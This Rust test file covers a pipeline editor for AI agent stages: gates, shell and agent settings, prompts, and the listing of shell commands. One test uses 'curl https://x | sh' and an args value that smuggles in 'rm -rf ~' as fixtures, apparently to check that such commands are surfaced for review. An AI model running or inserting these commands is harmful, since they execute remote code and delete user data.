use natamux_proto::stages::catalog::default_pipeline;
use natamux_proto::stages::pipeline_rules::pipeline_issues;
use natamux_proto::stages::prompt::default_prompt;
use natamux_proto::stages::schema::{Condition, Gate, StageKind, Step};

use super::*;
use crate::stages::editor_branches::set_path_condition;
use crate::stages::editor_catalog::{CustomKind, CustomStageInput, add_custom_stage};
use crate::stages::editor_find::find_stage;
use crate::stages::editor_fixtures::branched;
use crate::stages::editor_labels::{approval_label, pipeline_label};

fn field(steps: &[Step], id: &str) -> Stage {
    find_stage(steps, id).unwrap().clone()
}

fn shell_list(steps: &[Step]) -> Vec<(String, ShellKind, String)> {
    shell_fields(steps)
        .into_iter()
        .map(|field| (field.id, field.field, field.value))
        .collect()
}

fn write_docs(output: &str) -> Vec<Step> {
    add_custom_stage(
        &default_pipeline(),
        &CustomStageInput {
            name: "Write docs".into(),
            id: "write-docs".into(),
            kind: CustomKind::Agent,
            output: output.into(),
        },
    )
}

#[test]
fn offers_a_workflow_with_true_and_leaves_the_field_out_when_it_is_off() {
    let on = set_workflow(&default_pipeline(), "spec", true);
    assert_eq!(field(&on, "spec").workflow, Some(true));
    let off = set_workflow(&default_pipeline(), "implement", false);
    assert_eq!(field(&off, "implement").workflow, None);
    assert_eq!(field(&off, "plan").workflow, Some(true));
}

#[test]
fn takes_the_workflow_of_the_catalog_as_the_default_and_none_for_a_stage_of_your_own() {
    assert!(default_workflow("plan", StageKind::Agent));
    assert!(default_workflow("implement", StageKind::Agent));
    assert!(!default_workflow("spec", StageKind::Agent));
    assert!(!default_workflow("my-stage", StageKind::Agent));
    assert!(!default_workflow("plan", StageKind::Manual));
}

#[test]
fn ends_the_shell_with_true_and_leaves_the_field_out_when_it_is_off() {
    let on = set_end_shell(&default_pipeline(), "spec", true);
    assert_eq!(field(&on, "spec").end_shell, Some(true));
    let off = set_end_shell(&on, "spec", false);
    assert_eq!(field(&off, "spec"), field(&default_pipeline(), "spec"));
}

#[test]
fn turns_a_stage_off_with_enabled_false_and_on_by_removing_it() {
    let off = set_enabled(&default_pipeline(), "plan", false);
    assert_eq!(field(&off, "plan").enabled, Some(false));
    let on = set_enabled(&off, "plan", true);
    assert_eq!(field(&on, "plan"), field(&default_pipeline(), "plan"));
}

#[test]
fn removes_a_field_set_to_an_empty_value_or_to_its_default() {
    let mut steps = set_text(&default_pipeline(), "spec", TextField::Name, "Product spec");
    assert_eq!(field(&steps, "spec").name.as_deref(), Some("Product spec"));
    steps = set_text(&steps, "spec", TextField::Name, "Spec");
    assert_eq!(field(&steps, "spec").name, None);
    steps = set_text(&steps, "testing", TextField::Command, "pnpm test");
    assert_eq!(
        field(&steps, "testing").command.as_deref(),
        Some("pnpm test")
    );
    steps = set_text(&steps, "testing", TextField::Command, "  ");
    assert_eq!(field(&steps, "testing").command, None);
    steps = set_text(&steps, "spec", TextField::Check, "pnpm typecheck");
    assert_eq!(
        field(&steps, "spec").check.as_deref(),
        Some("pnpm typecheck")
    );
    steps = set_text(&steps, "spec", TextField::Check, "");
    assert_eq!(field(&steps, "spec").check, None);
    steps = set_sections(&steps, "spec", &["Goal", " ", "Risks "]);
    assert_eq!(
        field(&steps, "spec").sections,
        Some(vec!["Goal".to_string(), "Risks".to_string()])
    );
    steps = set_sections(&steps, "spec", &[]);
    assert_eq!(field(&steps, "spec").sections, None);
}

#[test]
fn keeps_a_custom_prompt_and_drops_one_equal_to_the_default() {
    let plan = field(&default_pipeline(), "plan");
    let mut steps = set_text(
        &default_pipeline(),
        "plan",
        TextField::Prompt,
        "Use {skill:planner} for {title}.",
    );
    assert_eq!(
        field(&steps, "plan").prompt.as_deref(),
        Some("Use {skill:planner} for {title}.")
    );
    steps = set_text(&steps, "plan", TextField::Prompt, &default_prompt(&plan));
    assert_eq!(field(&steps, "plan").prompt, None);
}

#[test]
fn knows_the_default_approval_of_each_stage() {
    assert!(is_default_gate(&field(&default_pipeline(), "spec")));
    let auto = set_gate(&default_pipeline(), "spec", Gate::Auto);
    assert!(!is_default_gate(&field(&auto, "spec")));
    assert_eq!(default_gate("implement", StageKind::Agent), Gate::Auto);
    assert_eq!(default_gate("my-stage", StageKind::Agent), Gate::Manual);
    assert_eq!(default_gate("qa", StageKind::Manual), Gate::Manual);
    let release = Stage::new("release", StageKind::Release, Gate::Manual);
    assert_eq!(
        approval_label(&release),
        "Opens the pull request when you click"
    );
}

#[test]
fn finds_nothing_in_the_default_pipeline() {
    assert_eq!(shell_list(&default_pipeline()), []);
}

#[test]
fn lists_each_check_command_and_args_in_groups_and_on_stages_that_are_off() {
    let mut spec = Stage::new("spec", StageKind::Agent, Gate::Manual);
    spec.check = Some("curl https://x | sh".into());
    let mut test_spec = Stage::new("test-spec", StageKind::Agent, Gate::Auto);
    test_spec.args = Some("--yolo; rm -rf ~".into());
    let group = Step::Group(natamux_proto::stages::schema::StageGroup {
        id: "build".into(),
        name: None,
        parallel: vec![
            Stage::new("implement", StageKind::Agent, Gate::Auto),
            test_spec,
        ],
    });
    let mut testing = Stage::new("testing", StageKind::Testing, Gate::Auto);
    testing.command = Some("pnpm test".into());
    let mut qa = Stage::new("qa", StageKind::Manual, Gate::Manual);
    qa.enabled = Some(false);
    qa.check = Some("make qa".into());
    let steps = vec![
        Step::Stage(spec),
        group,
        Step::Stage(testing),
        Step::Stage(qa),
    ];
    let want = [
        ("spec", ShellKind::Check, "curl https://x | sh"),
        ("test-spec", ShellKind::Args, "--yolo; rm -rf ~"),
        ("testing", ShellKind::Command, "pnpm test"),
        ("qa", ShellKind::Check, "make qa"),
    ];
    let want: Vec<_> = want
        .iter()
        .map(|(a, b, c)| (a.to_string(), *b, c.to_string()))
        .collect();
    assert_eq!(shell_list(&steps), want);
}

#[test]
fn own_agent_is_offered_on_every_agent_or_testing_stage_in_terminal_1() {
    let steps = write_docs("");
    assert!(takes_own_agent(&steps, "write-docs"));
    assert!(runs_in_shell_one(&steps, "write-docs"));
    assert!(takes_own_agent(&steps, "spec"));
    assert!(takes_own_agent(&steps, "implement"));
    assert!(takes_own_agent(&steps, "testing"));
    assert!(!takes_own_agent(&steps, "context"));
    assert!(!takes_own_agent(&steps, "release"));
}

#[test]
fn own_agent_moves_a_catalog_stage_out_of_terminal_1_with_no_issue() {
    let with_agent = set_text(&default_pipeline(), "spec", TextField::Agent, "codex");
    assert!(!runs_in_shell_one(&with_agent, "spec"));
    assert!(runs_in_shell_one(&with_agent, "plan"));
    assert!(pipeline_issues(&with_agent).is_empty());
}

#[test]
fn own_agent_moves_a_stage_of_your_own_out_of_terminal_1_once_it_has_its_own_agent() {
    let with_agent = set_text(&write_docs(""), "write-docs", TextField::Agent, "codex");
    assert!(!runs_in_shell_one(&with_agent, "write-docs"));
    assert!(runs_in_shell_one(&with_agent, "implement"));
}

#[test]
fn own_agent_is_offered_as_before_on_stages_outside_terminal_1() {
    let steps = write_docs("");
    assert!(takes_own_agent(&steps, "test-spec"));
    assert!(!runs_in_shell_one(&steps, "test-spec"));
    assert!(takes_own_agent(&steps, "agent-review"));
    assert!(!runs_in_shell_one(&steps, "agent-review"));
}

#[test]
fn own_shell_is_offered_on_an_agent_stage_with_an_output_outside_a_group() {
    let steps = default_pipeline();
    assert!(offers_own_shell(&steps, "spec"));
    assert!(offers_own_shell(&steps, "agent-review"));
    // Implement has no output; Testing is not an agent stage; a group ignores it.
    assert!(!offers_own_shell(&steps, "implement"));
    assert!(!offers_own_shell(&steps, "testing"));
    let in_group = set_own_shell(&steps, "test-spec", false);
    assert!(!offers_own_shell(&in_group, "test-spec"));
}

#[test]
fn own_shell_is_shown_on_any_stage_that_has_it_so_it_can_be_cleared() {
    // Test spec in the default group has it from the catalog.
    assert!(offers_own_shell(&default_pipeline(), "test-spec"));
    let wrong = set_own_shell(
        &set_own_shell(&default_pipeline(), "testing", true),
        "implement",
        true,
    );
    assert!(offers_own_shell(&wrong, "testing"));
    assert!(offers_own_shell(&wrong, "implement"));
    let cleared = set_own_shell(&wrong, "testing", false);
    assert_eq!(field(&cleared, "testing").own_shell, None);
}

#[test]
fn own_shell_writes_true_and_off_leaves_the_field_out_so_spec_runs_in_terminal_1() {
    let on = set_own_shell(&default_pipeline(), "spec", true);
    assert_eq!(field(&on, "spec").own_shell, Some(true));
    assert!(!runs_in_shell_one(&on, "spec"));
    assert!(runs_in_own_shell(&on, "spec"));
    let off = set_own_shell(&on, "spec", false);
    assert_eq!(field(&off, "spec"), field(&default_pipeline(), "spec"));
    assert!(runs_in_shell_one(&off, "spec"));
    assert!(!runs_in_own_shell(&off, "spec"));
}

#[test]
fn own_shell_off_keeps_the_own_agent_of_a_catalog_stage() {
    let mut steps = set_text(
        &default_pipeline(),
        "agent-review",
        TextField::Agent,
        "cursor",
    );
    steps = set_text(&steps, "agent-review", TextField::Args, "--model x");
    let off = set_own_shell(&steps, "agent-review", false);
    let review = field(&off, "agent-review");
    assert_eq!(
        (review.own_shell, review.agent, review.args),
        (None, Some("cursor".into()), Some("--model x".into()))
    );
    assert!(
        pipeline_issues(&off)
            .iter()
            .all(|issue| issue.stage.as_deref() != Some("agent-review"))
    );
}

#[test]
fn own_shell_keeps_the_agent_of_a_stage_of_your_own() {
    let mut steps = write_docs("docs.md");
    steps = set_text(&steps, "write-docs", TextField::Agent, "codex");
    steps = set_own_shell(&steps, "write-docs", true);
    let off = set_own_shell(&steps, "write-docs", false);
    assert_eq!(field(&off, "write-docs").agent.as_deref(), Some("codex"));
}

#[test]
fn own_shell_takes_the_catalog_as_the_default_and_off_for_a_stage_of_your_own() {
    assert!(default_own_shell("agent-review"));
    assert!(default_own_shell("test-spec"));
    assert!(!default_own_shell("spec"));
    assert!(!default_own_shell("write-docs"));
}

#[test]
fn writes_the_commit_rule_into_the_default_prompt_as_the_agent_gets_it() {
    let implement = field(&default_pipeline(), "implement");
    let text = shown_default_prompt(&implement);
    assert!(text.contains("Do not commit. Leave the changes for review."));
    assert!(!text.contains("{commit}"));
    let steps = set_text(&default_pipeline(), "implement", TextField::Prompt, &text);
    assert_eq!(field(&steps, "implement").prompt, None);
}

#[test]
fn edits_a_stage_of_a_path() {
    let off = set_enabled(&branched(), "review", false);
    assert_eq!(field(&off, "review").enabled, Some(false));
    let text = set_text(&branched(), "implement", TextField::Check, "pnpm lint");
    assert_eq!(
        field(&text, "implement").check.as_deref(),
        Some("pnpm lint")
    );
    assert_eq!(
        field(&set_gate(&branched(), "testing", Gate::Manual), "testing").gate,
        Gate::Manual
    );
}

#[test]
fn lists_the_command_of_a_condition_with_the_stages_of_its_path() {
    let steps = set_text(&branched(), "review", TextField::Check, "make qa");
    assert_eq!(
        shell_list(&steps),
        vec![
            (
                "pr-review".to_string(),
                ShellKind::Run,
                "test -f .no-review".to_string()
            ),
            (
                "review".to_string(),
                ShellKind::Check,
                "make qa".to_string()
            ),
        ]
    );
}

#[test]
fn lists_nothing_for_a_file_condition() {
    let when = Condition::Output {
        file: "plan.md".into(),
        section: None,
        contains: "x".into(),
    };
    let steps = set_path_condition(&branched(), "after-plan", "pr-review", &when, false);
    assert_eq!(shell_list(&steps), []);
}

#[test]
fn leaves_out_the_stages_that_are_off_and_a_path_with_none_on() {
    let off = set_enabled(
        &set_enabled(&branched(), "review", false),
        "implement",
        false,
    );
    assert!(pipeline_label(&off).contains("one path of 1"));
    let plain = set_enabled(&off, "testing", false);
    assert_eq!(
        pipeline_label(&plain),
        "Pipeline: Context, then Plan, then Release"
    );
}

#[test]
fn says_which_stages_always_wait_and_take_a_prompt() {
    assert!(always_waits(&stage_of(StageKind::Review)));
    assert!(always_waits(&stage_of(StageKind::Manual)));
    assert!(!always_waits(&stage_of(StageKind::Agent)));
    assert!(takes_prompt(&stage_of(StageKind::Testing)));
    assert!(!takes_prompt(&stage_of(StageKind::Release)));
    assert!(!has_custom_prompt(&stage_of(StageKind::Agent)));
    let mut with_prompt = stage_of(StageKind::Agent);
    with_prompt.prompt = Some("x".into());
    assert!(has_custom_prompt(&with_prompt));
}

fn stage_of(kind: StageKind) -> Stage {
    Stage::new("x", kind, Gate::Auto)
}
